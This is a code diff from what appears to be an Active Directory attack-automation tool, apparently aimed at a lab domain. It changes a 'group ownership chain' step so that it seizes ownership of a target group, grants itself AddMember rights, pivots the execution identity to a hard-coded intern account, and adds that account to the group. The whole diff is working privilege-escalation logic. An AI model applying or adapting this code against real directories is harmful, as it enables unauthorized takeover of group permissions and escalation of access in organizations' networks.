@@ -96,13 +96,13 @@ def _resolve_current_user_dn(actions, context):
     return None
 
 
-def _resolve_source_user_dn(actions):
-    candidates = [SOURCE_USER]
-    if "\\" in SOURCE_USER:
-        sam = SOURCE_USER.split("\\")[-1]
+def _resolve_source_user_dn(actions, source_user):
+    candidates = [source_user]
+    if "\\" in source_user:
+        sam = source_user.split("\\")[-1]
         candidates.extend([sam, f"{sam}@{DOMAIN}"])
-    elif "@" in SOURCE_USER:
-        candidates.append(SOURCE_USER.split("@")[0])
+    elif "@" in source_user:
+        candidates.append(source_user.split("@")[0])
 
     for candidate in candidates:
         resolved = actions.resolve_distinguished_name(candidate)
@@ -302,20 +302,41 @@ def execute_strict_action_plan(plan, actions, context):
             if not target_dn:
                 logging.error("GROUP OWNERSHIP CHAIN: unable to resolve target DN")
                 return False
-            source_user_dn = _resolve_source_user_dn(actions)
-            source_sid = _canonicalize_sid(actions.get_object_sid(SOURCE_USER))
-            if not source_user_dn or not source_sid:
-                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve source user DN or SID")
+
+            grant_actor = context.current_identity or SOURCE_USER
+            grant_actor_dn = _resolve_source_user_dn(actions, grant_actor)
+            grant_actor_sid = _canonicalize_sid(actions.get_object_sid(grant_actor))
+            target_member = "MIKE_INTERN@VIPERTECH.LOCAL"
+            target_member_dn = _resolve_source_user_dn(actions, target_member)
+            if not grant_actor_dn or not grant_actor_sid or not target_member_dn:
+                logging.error("GROUP OWNERSHIP CHAIN: unable to resolve the operator or member identity")
                 return False
-            if not _grant_group_addmember(actions, target_dn, source_sid):
+
+            owner_sid = actions.get_owner_sid(target_dn)
+            if owner_sid and owner_sid == grant_actor_sid and actions.is_member_of_group(target_dn, target_member_dn):
+                if context.switch_identity(target_member) and _refresh_bind(actions, context):
+                    logging.info(f"  [+] Reused satisfied ownership state and pivoted execution identity to {target_member}")
+                logging.info(f"  [+] {target_member} already has AddMember rights and is already in {target_name}; no additional change required.")
+                continue
+
+            if owner_sid != grant_actor_sid:
+                if not _safe_call("set_owner", actions.set_owner, target_dn, grant_actor_sid):
+                    return False
+                if not _refresh_bind(actions, context):
+                    return False
+
+            if not _grant_group_addmember(actions, target_dn, grant_actor_sid):
                 return False
             if not _refresh_bind(actions, context):
                 return False
-            if not context.switch_identity(SOURCE_USER):
+
+            if not context.switch_identity(target_member):
+                logging.error("GROUP OWNERSHIP CHAIN: could not switch to MIKE_INTERN after grant")
                 return False
             if not _refresh_bind(actions, context):
                 return False
-            if not _safe_call("add_group_member", actions.add_group_member, target_dn, source_user_dn):
+
+            if not _safe_call("add_group_member", actions.add_group_member, target_dn, target_member_dn):
                 return False
             continue
 
